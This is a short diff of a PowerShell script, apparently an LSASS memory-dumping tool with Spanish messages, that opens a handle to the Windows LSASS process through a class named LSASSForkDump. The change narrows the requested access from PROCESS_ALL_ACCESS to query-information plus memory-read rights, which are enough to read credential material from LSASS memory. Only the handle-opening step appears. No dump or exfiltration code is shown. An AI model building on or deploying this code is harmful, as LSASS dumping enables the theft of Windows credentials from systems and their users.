@@ -57,7 +57,10 @@ Write-Host ""
 # Abrir el proceso LSASS
 Write-Host "[*] Intentando abrir el proceso LSASS..." -ForegroundColor Yellow
 $lsass = Get-Process lsass
-$lsassHandle = [LSASSForkDump]::OpenProcess(0x001F0FFF, $false, $lsass.Id) # PROCESS_ALL_ACCESS
+$PROCESS_QUERY_INFORMATION = 0x0400
+$PROCESS_VM_READ = 0x0010
+$access = $PROCESS_QUERY_INFORMATION -bor $PROCESS_VM_READ
+$lsassHandle = [LSASSForkDump]::OpenProcess($access, $false, $lsass.Id)
 
 if ($lsassHandle -eq [IntPtr]::Zero) {
     Write-Host "[!] Error al abrir el proceso LSASS!" -ForegroundColor Red
